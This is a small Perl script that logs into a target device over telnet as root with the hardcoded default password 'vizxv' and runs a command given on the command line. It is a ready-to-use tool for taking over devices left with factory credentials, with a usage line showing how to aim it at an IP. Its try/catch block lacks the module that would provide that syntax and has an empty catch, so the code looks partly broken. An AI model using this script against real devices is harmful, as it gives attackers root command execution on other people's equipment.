#!/usr/bin/perl
use strict;       
use Net::Telnet ();
use Getopt::Std;


my %opts;
getopts('t:c:h', \%opts);


my $target = $opts{'t'} if $opts{'t'};
my $command = $opts{'c'} if $opts{'c'};

sub usage
{
  printf "\nUsage :\n";
  printf "perl passTelnet.pl -t {ip} -c ls \n\n";
  printf "";  
  exit(1);
}

# Print help message if required
if ($opts{'h'} || !(%opts)) {
	usage();
	exit 0;
}

my $t = new Net::Telnet (Timeout => 10);
$t->open($target);
    
  try {
   $t->login("root", "vizxv");
   my @lines = $t->cmd($command);
	print @lines;
  } catch{   
    
 }


